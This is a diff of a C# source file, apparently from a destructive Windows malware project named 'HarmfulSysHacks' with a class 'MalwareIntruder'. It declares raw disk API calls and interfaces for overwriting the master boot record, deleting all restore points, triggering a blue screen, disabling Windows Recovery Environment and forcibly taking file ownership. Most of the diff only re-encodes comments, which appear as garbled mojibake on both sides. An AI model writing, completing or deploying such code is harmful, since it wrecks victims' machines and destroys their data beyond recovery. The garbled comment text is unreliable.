@@ -1,4 +1,4 @@
-using System;
+ï»¿using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -12,214 +12,214 @@ namespace VortexSecOps
     namespace HarmfulSysHacks
     {
         /// <summary>
-        /// Windows API ³£Á¿
+        /// Windows API å¸¸é‡
         /// </summary>
-        public enum Windows_API_Constants
+        public enum Windows_API_Constants:uint
         {
-            // ÎÄ¼ş¹²ÏíÄ£Ê½
+            // æ–‡ä»¶å…±äº«æ¨¡å¼
             /// <summary>
-            /// ÎÄ¼ş¹²Ïí¶ÁÈ¡Ä£Ê½
+            /// æ–‡ä»¶å…±äº«è¯»å–æ¨¡å¼
             /// </summary>
             File_Share_Read = 0x00000001,
             /// <summary>
-            /// ÎÄ¼ş¹²ÏíĞ´ÈëÄ£Ê½
+            /// æ–‡ä»¶å…±äº«å†™å…¥æ¨¡å¼
             /// </summary>
             File_Share_Write = 0x00000002,
 
-            // ÎÄ¼ş·ÃÎÊÈ¨ÏŞ
+            // æ–‡ä»¶è®¿é—®æƒé™
             /// <summary>
-            /// Í¨ÓÃ¶ÁÈ¡·ÃÎÊÈ¨ÏŞ
+            /// é€šç”¨è¯»å–è®¿é—®æƒé™
             /// </summary>
-            Generic_Read = unchecked((int)0x80000000),
+            Generic_Read = 0x80000000,
             /// <summary>
-            /// Í¨ÓÃĞ´Èë·ÃÎÊÈ¨ÏŞ
+            /// é€šç”¨å†™å…¥è®¿é—®æƒé™
             /// </summary>
             Generic_Write = 0x40000000,
 
-            // ÎÄ¼ş´´½¨²Ù×÷
+            // æ–‡ä»¶åˆ›å»ºæ“ä½œ
             /// <summary>
-            /// ´ò¿ªÒÑ´æÔÚµÄÎÄ¼ş
+            /// æ‰“å¼€å·²å­˜åœ¨çš„æ–‡ä»¶
             /// </summary>
             Open_Existing = 3,
         }
         /// <summary>
-        /// ¶¨ÒåÁËÓë Windows API ²Ù×÷Ïà¹ØµÄ½Ó¿Ú£¬¼Ì³Ğ×Ô <see cref="IConfigCorrupter"/> ½Ó¿Ú¡£
+        /// å®šä¹‰äº†ä¸ Windows API æ“ä½œç›¸å…³çš„æ¥å£ï¼Œç»§æ‰¿è‡ª <see cref="IConfigCorrupter"/> æ¥å£ã€‚
         /// </summary>
         public interface IWindowsAPIOperator : IConfigCorrupter
         {
             bool CloseHandle(HANDLE hObject);
             /// <summary>
-            /// ½«Êı¾İĞ´ÈëÖ¸¶¨µÄÎÄ¼ş»òÊäÈë/Êä³ö£¨I/O£©Éè±¸¡£
+            /// å°†æ•°æ®å†™å…¥æŒ‡å®šçš„æ–‡ä»¶æˆ–è¾“å…¥/è¾“å‡ºï¼ˆI/Oï¼‰è®¾å¤‡ã€‚
             /// </summary>
-            /// <param name="hFile">ÒªĞ´ÈëÊı¾İµÄÎÄ¼ş¾ä±ú¡£</param>
-            /// <param name="lpBuffer">Ö¸Ïò°üº¬ÒªĞ´ÈëÊı¾İµÄ»º³åÇøµÄÖ¸Õë¡£</param>
-            /// <param name="nNumberOfBytesToWrite">Òª´Ó»º³åÇøĞ´ÈëµÄ×Ö½ÚÊı¡£</param>
-            /// <param name="lpNumberOfBytesWritten">Ö¸ÏòÒ»¸ö±äÁ¿µÄÖ¸Õë£¬¸Ã±äÁ¿ÓÃÓÚ½ÓÊÕÊµ¼ÊĞ´ÈëµÄ×Ö½ÚÊı¡£</param>
-            /// <param name="lpOverlapped">Ö¸ÏòOVERLAPPED½á¹¹µÄÖ¸Õë£¨ÈôÊÊÓÃ£©¡£</param>
+            /// <param name="hFile">è¦å†™å…¥æ•°æ®çš„æ–‡ä»¶å¥æŸ„ã€‚</param>
+            /// <param name="lpBuffer">æŒ‡å‘åŒ…å«è¦å†™å…¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚</param>
+            /// <param name="nNumberOfBytesToWrite">è¦ä»ç¼“å†²åŒºå†™å…¥çš„å­—èŠ‚æ•°ã€‚</param>
+            /// <param name="lpNumberOfBytesWritten">æŒ‡å‘ä¸€ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡ç”¨äºæ¥æ”¶å®é™…å†™å…¥çš„å­—èŠ‚æ•°ã€‚</param>
+            /// <param name="lpOverlapped">æŒ‡å‘OVERLAPPEDç»“æ„çš„æŒ‡é’ˆï¼ˆè‹¥é€‚ç”¨ï¼‰ã€‚</param>
             /// <returns>
-            /// º¯ÊıÈç¹û³É¹¦£¬Ôò·µ»Øtrue£»º¯ÊıÈç¹ûÊ§°Ü£¬Ôò·µ»Øfalse¡£
+            /// å‡½æ•°å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›trueï¼›å‡½æ•°å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å›falseã€‚
             /// </returns>
             bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);
             /// <summary>
-            /// ´´½¨»ò´ò¿ªÎÄ¼ş»òI/OÉè±¸¡£
+            /// åˆ›å»ºæˆ–æ‰“å¼€æ–‡ä»¶æˆ–I/Oè®¾å¤‡ã€‚
             /// </summary>
-            /// <param name="lpFileName">Òª´´½¨»ò´ò¿ªµÄÎÄ¼ş»òÉè±¸µÄÃû³Æ¡£</param>
-            /// <param name="dwDesiredAccess">¶ÔÎÄ¼ş»òÉè±¸ÆÚÍûµÄ·ÃÎÊÈ¨ÏŞ¡£</param>
-            /// <param name="dwShareMode">ÎÄ¼ş»òÉè±¸µÄ¹²ÏíÄ£Ê½¡£</param>
-            /// <param name="lpSecurityAttributes">Ö¸ÏòSECURITY_ATTRIBUTES½á¹¹µÄÖ¸Õë£¬ÓÃÓÚÈ·¶¨ÎÄ¼ş»òÉè±¸µÄ°²È«ÊôĞÔ¡£</param>
-            /// <param name="dwCreationDisposition">µ±ÎÄ¼ş»òÉè±¸´æÔÚÓë·ñÊ±Ó¦²ÉÈ¡µÄ²Ù×÷¡£</param>
-            /// <param name="dwFlagsAndAttributes">ÎÄ¼ş»òÉè±¸µÄÊôĞÔ¼°±êÖ¾¡£</param>
-            /// <param name="hTemplateFile">Ö¸ÏòÄ£°åÎÄ¼şµÄ¾ä±ú£¨ÈôÊÊÓÃ£©¡£</param>
+            /// <param name="lpFileName">è¦åˆ›å»ºæˆ–æ‰“å¼€çš„æ–‡ä»¶æˆ–è®¾å¤‡çš„åç§°ã€‚</param>
+            /// <param name="dwDesiredAccess">å¯¹æ–‡ä»¶æˆ–è®¾å¤‡æœŸæœ›çš„è®¿é—®æƒé™ã€‚</param>
+            /// <param name="dwShareMode">æ–‡ä»¶æˆ–è®¾å¤‡çš„å…±äº«æ¨¡å¼ã€‚</param>
+            /// <param name="lpSecurityAttributes">æŒ‡å‘SECURITY_ATTRIBUTESç»“æ„çš„æŒ‡é’ˆï¼Œç”¨äºç¡®å®šæ–‡ä»¶æˆ–è®¾å¤‡çš„å®‰å…¨å±æ€§ã€‚</param>
+            /// <param name="dwCreationDisposition">å½“æ–‡ä»¶æˆ–è®¾å¤‡å­˜åœ¨ä¸å¦æ—¶åº”é‡‡å–çš„æ“ä½œã€‚</param>
+            /// <param name="dwFlagsAndAttributes">æ–‡ä»¶æˆ–è®¾å¤‡çš„å±æ€§åŠæ ‡å¿—ã€‚</param>
+            /// <param name="hTemplateFile">æŒ‡å‘æ¨¡æ¿æ–‡ä»¶çš„å¥æŸ„ï¼ˆè‹¥é€‚ç”¨ï¼‰ã€‚</param>
             /// <returns></returns>
             HANDLE CreateFileA(string lpFileName, Windows_API_Constants dwDesiredAccess, Windows_API_Constants dwShareMode, uint lpSecurityAttributes, Windows_API_Constants dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
             /// <summary>
-            /// ´ÓÖ¸¶¨µÄÎÄ¼ş»òÊäÈë/Êä³ö£¨I/O£©Éè±¸¶ÁÈ¡Êı¾İ¡£ Èç¹ûÉè±¸Ö§³Ö£¬Ôò¶ÁÈ¡·¢ÉúÔÚÎÄ¼şÖ¸ÕëÖ¸¶¨µÄÎ»ÖÃ¡£
+            /// ä»æŒ‡å®šçš„æ–‡ä»¶æˆ–è¾“å…¥/è¾“å‡ºï¼ˆI/Oï¼‰è®¾å¤‡è¯»å–æ•°æ®ã€‚ å¦‚æœè®¾å¤‡æ”¯æŒï¼Œåˆ™è¯»å–å‘ç”Ÿåœ¨æ–‡ä»¶æŒ‡é’ˆæŒ‡å®šçš„ä½ç½®ã€‚
             /// </summary>
-            /// <param name="hFile">Éè±¸µÄ¾ä±ú£¨ÀıÈçÎÄ¼ş¡¢ÎÄ¼şÁ÷¡¢ÎïÀí´ÅÅÌ¡¢¾í¡¢¿ØÖÆÌ¨»º³åÇø¡¢´Å´øÇı¶¯Æ÷¡¢Ì×½Ó×Ö¡¢Í¨ĞÅ×ÊÔ´¡¢mailslot »ò¹ÜµÀ£©¡£</param>
-            /// <param name="lpBuffer">Ö¸Ïò½ÓÊÕ´ÓÎÄ¼ş»òÉè±¸¶ÁÈ¡µÄÊı¾İµÄ»º³åÇøµÄÖ¸Õë¡£</param>
-            /// <param name="nNumberOfBytesToRead">Òª¶ÁÈ¡µÄ×î´ó×Ö½ÚÊı¡£</param>
-            /// <param name="lpNumberOfBytesRead">Ö¸ÏòÊ¹ÓÃÍ¬²½ hFile ²ÎÊıÊ±½ÓÊÕ¶ÁÈ¡µÄ×Ö½ÚÊıµÄ±äÁ¿µÄÖ¸Õë¡£</param>
+            /// <param name="hFile">è®¾å¤‡çš„å¥æŸ„ï¼ˆä¾‹å¦‚æ–‡ä»¶ã€æ–‡ä»¶æµã€ç‰©ç†ç£ç›˜ã€å·ã€æ§åˆ¶å°ç¼“å†²åŒºã€ç£å¸¦é©±åŠ¨å™¨ã€å¥—æ¥å­—ã€é€šä¿¡èµ„æºã€mailslot æˆ–ç®¡é“ï¼‰ã€‚</param>
+            /// <param name="lpBuffer">æŒ‡å‘æ¥æ”¶ä»æ–‡ä»¶æˆ–è®¾å¤‡è¯»å–çš„æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚</param>
+            /// <param name="nNumberOfBytesToRead">è¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚</param>
+            /// <param name="lpNumberOfBytesRead">æŒ‡å‘ä½¿ç”¨åŒæ­¥ hFile å‚æ•°æ—¶æ¥æ”¶è¯»å–çš„å­—èŠ‚æ•°çš„å˜é‡çš„æŒ‡é’ˆã€‚</param>
             /// <param name="lpOverlapped">
-            /// Ö¸Ïò <see cref="OVERLAPPED"/> ½á¹¹ÌåµÄÖ¸Õë
+            /// æŒ‡å‘ <see cref="OVERLAPPED"/> ç»“æ„ä½“çš„æŒ‡é’ˆ
             /// </param>
             /// <returns>
-            /// Èç¹ûº¯Êı³É¹¦£¬·µ»ØÖµÎª·ÇÁãÖµ£¨±íÊ¾ <c>true</c>£©¡£
-            /// Èç¹ûº¯ÊıÊ§°Ü£¬·µ»ØÖµÎªÁã£¨±íÊ¾ <c>false</c>£©¡£
+            /// å¦‚æœå‡½æ•°æˆåŠŸï¼Œè¿”å›å€¼ä¸ºéé›¶å€¼ï¼ˆè¡¨ç¤º <c>true</c>ï¼‰ã€‚
+            /// å¦‚æœå‡½æ•°å¤±è´¥ï¼Œè¿”å›å€¼ä¸ºé›¶ï¼ˆè¡¨ç¤º <c>false</c>ï¼‰ã€‚
             /// </returns>
             bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);
             /// <summary>
-            /// ĞŞ¸ÄÖ÷Òıµ¼¼ÇÂ¼£¨MBR£©¡£
+            /// ä¿®æ”¹ä¸»å¼•å¯¼è®°å½•ï¼ˆMBRï¼‰ã€‚
             /// </summary>
-            /// <returns>Èç¹ûĞŞ¸Ä³É¹¦£¬·µ»Ø <c>true</c>£»·ñÔò·µ»Ø <c>false</c>¡£</returns>
+            /// <returns>å¦‚æœä¿®æ”¹æˆåŠŸï¼Œè¿”å› <c>true</c>ï¼›å¦åˆ™è¿”å› <c>false</c>ã€‚</returns>
             bool ModifyMasterBootRecord();
             /// <summary>
-            /// ½«Ö¸¶¨µÄ×Ö½ÚÊı×éÊı¾İĞ´ÈëÖ÷Òıµ¼¼ÇÂ¼£¨MBR£©¡£
+            /// å°†æŒ‡å®šçš„å­—èŠ‚æ•°ç»„æ•°æ®å†™å…¥ä¸»å¼•å¯¼è®°å½•ï¼ˆMBRï¼‰ã€‚
             /// </summary>
-            /// <param name="buffer">ÒªĞ´Èë MBR µÄ×Ö½ÚÊı×éÊı¾İ¡£</param>
-            /// <returns>Èç¹ûĞ´Èë³É¹¦£¬·µ»Ø <c>true</c>£»·ñÔò·µ»Ø <c>false</c>¡£</returns>
+            /// <param name="buffer">è¦å†™å…¥ MBR çš„å­—èŠ‚æ•°ç»„æ•°æ®ã€‚</param>
+            /// <returns>å¦‚æœå†™å…¥æˆåŠŸï¼Œè¿”å› <c>true</c>ï¼›å¦åˆ™è¿”å› <c>false</c>ã€‚</returns>
             bool WriteToMasterBootRecord(byte[] buffer);
         }
         /// <summary>
-        /// ¶¨ÒåÁË³£¹æ²Ù×÷Ïà¹ØµÄ½Ó¿Ú£¬¼Ì³Ğ×Ô <see cref="IConfigCorrupter"/> ½Ó¿Ú¡£
+        /// å®šä¹‰äº†å¸¸è§„æ“ä½œç›¸å…³çš„æ¥å£ï¼Œç»§æ‰¿è‡ª <see cref="IConfigCorrupter"/> æ¥å£ã€‚
         /// </summary>
         public interface INormalOperator : IConfigCorrupter
         {
             /// <summary>
-            /// ĞŞ¸ÄÖ÷Òıµ¼¼ÇÂ¼£¨MBR£©¡£
+            /// ä¿®æ”¹ä¸»å¼•å¯¼è®°å½•ï¼ˆMBRï¼‰ã€‚
             /// </summary>
             void ModifyMasterBootRecord();
             /// <summary>
-            /// ½«Ö¸¶¨µÄ×Ö½ÚÊı×éÊı¾İĞ´ÈëÖ÷Òıµ¼¼ÇÂ¼£¨MBR£©¡£
+            /// å°†æŒ‡å®šçš„å­—èŠ‚æ•°ç»„æ•°æ®å†™å…¥ä¸»å¼•å¯¼è®°å½•ï¼ˆMBRï¼‰ã€‚
             /// </summary>
-            /// <param name="buffer">ÒªĞ´Èë MBR µÄ×Ö½ÚÊı×éÊı¾İ¡£</param>
+            /// <param name="buffer">è¦å†™å…¥ MBR çš„å­—èŠ‚æ•°ç»„æ•°æ®ã€‚</param>
             void WriteToMasterBootRecord(byte[] buffer);
         }
         /// <summary>
-        /// ¶¨ÒåÁËÅäÖÃÆÆ»µÏà¹Ø²Ù×÷µÄ½Ó¿Ú¡£
+        /// å®šä¹‰äº†é…ç½®ç ´åç›¸å…³æ“ä½œçš„æ¥å£ã€‚
         /// </summary>
         public interface IConfigCorrupter
         {
             /// <summary>
-            /// É¾³ıËùÓĞ¾íÓ°¸±±¾
+            /// åˆ é™¤æ‰€æœ‰å·å½±å‰¯æœ¬
             /// </summary>
             void DeleteAllRestorePoints();
             /// <summary>
-            /// ´¥·¢ÏµÍ³À¶ÆÁ¡£
+            /// è§¦å‘ç³»ç»Ÿè“å±ã€‚
             /// </summary>
             void TriggerBlueScreen();
             /// <summary>
-            /// ½ûÓÃ Windows »Ö¸´»·¾³¡£
+            /// ç¦ç”¨ Windows æ¢å¤ç¯å¢ƒã€‚
             /// </summary>
             void DisableWindowsRecoveryEnvironment();
             /// <summary>
-            /// ÖØÆô¼ÆËã»ú¡£
+            /// é‡å¯è®¡ç®—æœºã€‚
             /// </summary>
             void RestartComputer();
 
         }
 
-        // ´ËÀà°üº¬ÁË±»¶ñÒâ³ÌĞòÊ¹ÓÃµÄÓëÏµÍ³¼¶±ğ²Ù×÷Ïà¹ØµÄ¶à¸ö·½·¨
+        // æ­¤ç±»åŒ…å«äº†è¢«æ¶æ„ç¨‹åºä½¿ç”¨çš„ä¸ç³»ç»Ÿçº§åˆ«æ“ä½œç›¸å…³çš„å¤šä¸ªæ–¹æ³•
         public class MalwareIntruder
         {
-            // Ë½ÓĞ¹¹Ôìº¯Êı£¬·ÀÖ¹Íâ²¿ÊµÀı»¯
+            // ç§æœ‰æ„é€ å‡½æ•°ï¼Œé˜²æ­¢å¤–éƒ¨å®ä¾‹åŒ–
             private MalwareIntruder() { }
-            // ¶¨Òå MBR ±¸·İÎÄ¼şµÄÂ·¾¶
+            // å®šä¹‰ MBR å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„
             private const string MBR_PATH = @"C:\bin\mbr.bin";
             /// <summary>
-            /// ´ÓÖ¸¶¨µÄÎÄ¼ş»òÊäÈë/Êä³ö£¨I/O£©Éè±¸¶ÁÈ¡Êı¾İ¡£ Èç¹ûÉè±¸Ö§³Ö£¬Ôò¶ÁÈ¡·¢ÉúÔÚÎÄ¼şÖ¸ÕëÖ¸¶¨µÄÎ»ÖÃ¡£
+            /// ä»æŒ‡å®šçš„æ–‡ä»¶æˆ–è¾“å…¥/è¾“å‡ºï¼ˆI/Oï¼‰è®¾å¤‡è¯»å–æ•°æ®ã€‚ å¦‚æœè®¾å¤‡æ”¯æŒï¼Œåˆ™è¯»å–å‘ç”Ÿåœ¨æ–‡ä»¶æŒ‡é’ˆæŒ‡å®šçš„ä½ç½®ã€‚
             /// </summary>
-            /// <param name="hFile">Éè±¸µÄ¾ä±ú£¨ÀıÈçÎÄ¼ş¡¢ÎÄ¼şÁ÷¡¢ÎïÀí´ÅÅÌ¡¢¾í¡¢¿ØÖÆÌ¨»º³åÇø¡¢´Å´øÇı¶¯Æ÷¡¢Ì×½Ó×Ö¡¢Í¨ĞÅ×ÊÔ´¡¢mailslot »ò¹ÜµÀ£©¡£</param>
-            /// <param name="lpBuffer">Ö¸Ïò½ÓÊÕ´ÓÎÄ¼ş»òÉè±¸¶ÁÈ¡µÄÊı¾İµÄ»º³åÇøµÄÖ¸Õë¡£</param>
-            /// <param name="nNumberOfBytesToRead">Òª¶ÁÈ¡µÄ×î´ó×Ö½ÚÊı¡£</param>
-            /// <param name="lpNumberOfBytesRead">Ö¸ÏòÊ¹ÓÃÍ¬²½ hFile ²ÎÊıÊ±½ÓÊÕ¶ÁÈ¡µÄ×Ö½ÚÊıµÄ±äÁ¿µÄÖ¸Õë¡£</param>
+            /// <param name="hFile">è®¾å¤‡çš„å¥æŸ„ï¼ˆä¾‹å¦‚æ–‡ä»¶ã€æ–‡ä»¶æµã€ç‰©ç†ç£ç›˜ã€å·ã€æ§åˆ¶å°ç¼“å†²åŒºã€ç£å¸¦é©±åŠ¨å™¨ã€å¥—æ¥å­—ã€é€šä¿¡èµ„æºã€mailslot æˆ–ç®¡é“ï¼‰ã€‚</param>
+            /// <param name="lpBuffer">æŒ‡å‘æ¥æ”¶ä»æ–‡ä»¶æˆ–è®¾å¤‡è¯»å–çš„æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚</param>
+            /// <param name="nNumberOfBytesToRead">è¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ã€‚</param>
+            /// <param name="lpNumberOfBytesRead">æŒ‡å‘ä½¿ç”¨åŒæ­¥ hFile å‚æ•°æ—¶æ¥æ”¶è¯»å–çš„å­—èŠ‚æ•°çš„å˜é‡çš„æŒ‡é’ˆã€‚</param>
             /// <param name="lpOverlapped">
-            /// Ö¸Ïò <see cref="OVERLAPPED"/> ½á¹¹ÌåµÄÖ¸Õë
+            /// æŒ‡å‘ <see cref="OVERLAPPED"/> ç»“æ„ä½“çš„æŒ‡é’ˆ
             /// </param>
             /// <returns>
-            /// Èç¹ûº¯Êı³É¹¦£¬·µ»ØÖµÎª·ÇÁãÖµ£¨±íÊ¾ <c>true</c>£©¡£
-            /// Èç¹ûº¯ÊıÊ§°Ü£¬·µ»ØÖµÎªÁã£¨±íÊ¾ <c>false</c>£©¡£
+            /// å¦‚æœå‡½æ•°æˆåŠŸï¼Œè¿”å›å€¼ä¸ºéé›¶å€¼ï¼ˆè¡¨ç¤º <c>true</c>ï¼‰ã€‚
+            /// å¦‚æœå‡½æ•°å¤±è´¥ï¼Œè¿”å›å€¼ä¸ºé›¶ï¼ˆè¡¨ç¤º <c>false</c>ï¼‰ã€‚
             /// </returns>
             [DllImport("kernel32.dll", SetLastError = true)]
             [return: MarshalAs(UnmanagedType.Bool)]
             private static extern bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);
 
             /// <summary>
-            /// ´´½¨»ò´ò¿ªÎÄ¼ş»òI/OÉè±¸¡£
+            /// åˆ›å»ºæˆ–æ‰“å¼€æ–‡ä»¶æˆ–I/Oè®¾å¤‡ã€‚
             /// </summary>
-            /// <param name="lpFileName">Òª´´½¨»ò´ò¿ªµÄÎÄ¼ş»òÉè±¸µÄÃû³Æ¡£</param>
-            /// <param name="dwDesiredAccess">¶ÔÎÄ¼ş»òÉè±¸ÆÚÍûµÄ·ÃÎÊÈ¨ÏŞ¡£</param>
-            /// <param name="dwShareMode">ÎÄ¼ş»òÉè±¸µÄ¹²ÏíÄ£Ê½¡£</param>
-            /// <param name="lpSecurityAttributes">Ö¸ÏòSECURITY_ATTRIBUTES½á¹¹µÄÖ¸Õë£¬ÓÃÓÚÈ·¶¨ÎÄ¼ş»òÉè±¸µÄ°²È«ÊôĞÔ¡£</param>
-            /// <param name="dwCreationDisposition">µ±ÎÄ¼ş»òÉè±¸´æÔÚÓë·ñÊ±Ó¦²ÉÈ¡µÄ²Ù×÷¡£</param>
-            /// <param name="dwFlagsAndAttributes">ÎÄ¼ş»òÉè±¸µÄÊôĞÔ¼°±êÖ¾¡£</param>
-            /// <param name="hTemplateFile">Ö¸ÏòÄ£°åÎÄ¼şµÄ¾ä±ú£¨ÈôÊÊÓÃ£©¡£</param>
+            /// <param name="lpFileName">è¦åˆ›å»ºæˆ–æ‰“å¼€çš„æ–‡ä»¶æˆ–è®¾å¤‡çš„åç§°ã€‚</param>
+            /// <param name="dwDesiredAccess">å¯¹æ–‡ä»¶æˆ–è®¾å¤‡æœŸæœ›çš„è®¿é—®æƒé™ã€‚</param>
+            /// <param name="dwShareMode">æ–‡ä»¶æˆ–è®¾å¤‡çš„å…±äº«æ¨¡å¼ã€‚</param>
+            /// <param name="lpSecurityAttributes">æŒ‡å‘SECURITY_ATTRIBUTESç»“æ„çš„æŒ‡é’ˆï¼Œç”¨äºç¡®å®šæ–‡ä»¶æˆ–è®¾å¤‡çš„å®‰å…¨å±æ€§ã€‚</param>
+            /// <param name="dwCreationDisposition">å½“æ–‡ä»¶æˆ–è®¾å¤‡å­˜åœ¨ä¸å¦æ—¶åº”é‡‡å–çš„æ“ä½œã€‚</param>
+            /// <param name="dwFlagsAndAttributes">æ–‡ä»¶æˆ–è®¾å¤‡çš„å±æ€§åŠæ ‡å¿—ã€‚</param>
+            /// <param name="hTemplateFile">æŒ‡å‘æ¨¡æ¿æ–‡ä»¶çš„å¥æŸ„ï¼ˆè‹¥é€‚ç”¨ï¼‰ã€‚</param>
             /// <returns></returns>
             [DllImport("kernel32.dll", SetLastError = true)]
             private static extern HANDLE CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
 
             /// <summary>
-            /// ½«Êı¾İĞ´ÈëÖ¸¶¨µÄÎÄ¼ş»òÊäÈë/Êä³ö£¨I/O£©Éè±¸¡£
+            /// å°†æ•°æ®å†™å…¥æŒ‡å®šçš„æ–‡ä»¶æˆ–è¾“å…¥/è¾“å‡ºï¼ˆI/Oï¼‰è®¾å¤‡ã€‚
             /// </summary>
-            /// <param name="hFile">ÒªĞ´ÈëÊı¾İµÄÎÄ¼ş¾ä±ú¡£</param>
-            /// <param name="lpBuffer">Ö¸Ïò°üº¬ÒªĞ´ÈëÊı¾İµÄ»º³åÇøµÄÖ¸Õë¡£</param>
-            /// <param name="nNumberOfBytesToWrite">Òª´Ó»º³åÇøĞ´ÈëµÄ×Ö½ÚÊı¡£</param>
-            /// <param name="lpNumberOfBytesWritten">Ö¸ÏòÒ»¸ö±äÁ¿µÄÖ¸Õë£¬¸Ã±äÁ¿ÓÃÓÚ½ÓÊÕÊµ¼ÊĞ´ÈëµÄ×Ö½ÚÊı¡£</param>
-            /// <param name="lpOverlapped">Ö¸ÏòOVERLAPPED½á¹¹µÄÖ¸Õë£¨ÈôÊÊÓÃ£©¡£</param>
+            /// <param name="hFile">è¦å†™å…¥æ•°æ®çš„æ–‡ä»¶å¥æŸ„ã€‚</param>
+            /// <param name="lpBuffer">æŒ‡å‘åŒ…å«è¦å†™å…¥æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚</param>
+            /// <param name="nNumberOfBytesToWrite">è¦ä»ç¼“å†²åŒºå†™å…¥çš„å­—èŠ‚æ•°ã€‚</param>
+            /// <param name="lpNumberOfBytesWritten">æŒ‡å‘ä¸€ä¸ªå˜é‡çš„æŒ‡é’ˆï¼Œè¯¥å˜é‡ç”¨äºæ¥æ”¶å®é™…å†™å…¥çš„å­—èŠ‚æ•°ã€‚</param>
+            /// <param name="lpOverlapped">æŒ‡å‘OVERLAPPEDç»“æ„çš„æŒ‡é’ˆï¼ˆè‹¥é€‚ç”¨ï¼‰ã€‚</param>
             /// <returns>
-            /// º¯ÊıÈç¹û³É¹¦£¬Ôò·µ»Øtrue£»º¯ÊıÈç¹ûÊ§°Ü£¬Ôò·µ»Øfalse¡£
+            /// å‡½æ•°å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›trueï¼›å‡½æ•°å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å›falseã€‚
             /// </returns>
             [DllImport("kernel32.dll", SetLastError = true)]
             [return: MarshalAs(UnmanagedType.Bool)]
             private static extern bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);
 
-            // ¶¨ÒåÎÄ¼ş¹²ÏíÄ£Ê½³£Á¿
+            // å®šä¹‰æ–‡ä»¶å…±äº«æ¨¡å¼å¸¸é‡
             private const int File_Share_Read = 0x00000001;
             private const int File_Share_Write = 0x00000002;
-            // ¶¨ÒåÎÄ¼ş·ÃÎÊÈ¨ÏŞ³£Á¿
+            // å®šä¹‰æ–‡ä»¶è®¿é—®æƒé™å¸¸é‡
             private const uint Generic_Read = 0x80000000;
             private const uint Generic_Write = 0x40000000;
-            // ¶¨ÒåÎÄ¼ş´´½¨²Ù×÷³£Á¿
+            // å®šä¹‰æ–‡ä»¶åˆ›å»ºæ“ä½œå¸¸é‡
             private const int Open_Existing = 3;
 
-            // ¹Ø±Õ¾ä±úµÄ Windows API º¯Êı
+            // å…³é—­å¥æŸ„çš„ Windows API å‡½æ•°
             [DllImport("kernel32.dll", SetLastError = true)]
             [return: MarshalAs(UnmanagedType.Bool)]
             private extern static bool CloseHandle(HANDLE hObject);
             /// <summary>
-            /// ÓÃÓÚÉèÖÃ½ø³ÌĞÅÏ¢¡£
+            /// ç”¨äºè®¾ç½®è¿›ç¨‹ä¿¡æ¯ã€‚
             /// </summary>
-            /// <param name="hProcess">½ø³ÌµÄ¾ä±ú¡£</param>
-            /// <param name="processInformationClass">ÒªÉèÖÃµÄ½ø³ÌĞÅÏ¢ÀàĞÍ¡£</param>
-            /// <param name="processInformation">Ö¸Ïò°üº¬ÒªÉèÖÃµÄ½ø³ÌĞÅÏ¢µÄ»º³åÇøµÄÖ¸Õë¡£</param>
-            /// <param name="processInformationLength">½ø³ÌĞÅÏ¢»º³åÇøµÄ³¤¶È¡£</param>
+            /// <param name="hProcess">è¿›ç¨‹çš„å¥æŸ„ã€‚</param>
+            /// <param name="processInformationClass">è¦è®¾ç½®çš„è¿›ç¨‹ä¿¡æ¯ç±»å‹ã€‚</param>
+            /// <param name="processInformation">æŒ‡å‘åŒ…å«è¦è®¾ç½®çš„è¿›ç¨‹ä¿¡æ¯çš„ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚</param>
+            /// <param name="processInformationLength">è¿›ç¨‹ä¿¡æ¯ç¼“å†²åŒºçš„é•¿åº¦ã€‚</param>
             /// <returns></returns>
             [DllImport("ntdll.dll", SetLastError = true)]
             private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
             /// <summary>
-            /// »ñÈ¡Ö¸¶¨µÄÎÄ¼şËùÓĞÈ¨£¬²¢Ö´ĞĞ²Ù×÷
+            /// è·å–æŒ‡å®šçš„æ–‡ä»¶æ‰€æœ‰æƒï¼Œå¹¶æ‰§è¡Œæ“ä½œ
             /// </summary>
-            /// <param name="iFile">ÎÄ¼şÂ·¾¶</param>
-            /// <param name="action">»ñÈ¡µ½ËùÓĞÈ¨ºóÖ´ĞĞµÄ²Ù×÷</param>
+            /// <param name="iFile">æ–‡ä»¶è·¯å¾„</param>
+            /// <param name="action">è·å–åˆ°æ‰€æœ‰æƒåæ‰§è¡Œçš„æ“ä½œ</param>
             public static void TakeOwnershipOfFile(string iFile, Action<string> action)
             {
                 ProcessStartInfo takeownPsi = new ProcessStartInfo
@@ -243,9 +243,9 @@ namespace VortexSecOps
                 action.Invoke(iFile);
             }
             /// <summary>
-            /// »ñÈ¡Ö¸¶¨µÄÎÄ¼şËùÓĞÈ¨
+            /// è·å–æŒ‡å®šçš„æ–‡ä»¶æ‰€æœ‰æƒ
             /// </summary>
-            /// <param name="iFile">ÎÄ¼şÂ·¾¶</param>
+            /// <param name="iFile">æ–‡ä»¶è·¯å¾„</param>
             public static void TakeOwnershipOfFile(string iFile)
             {
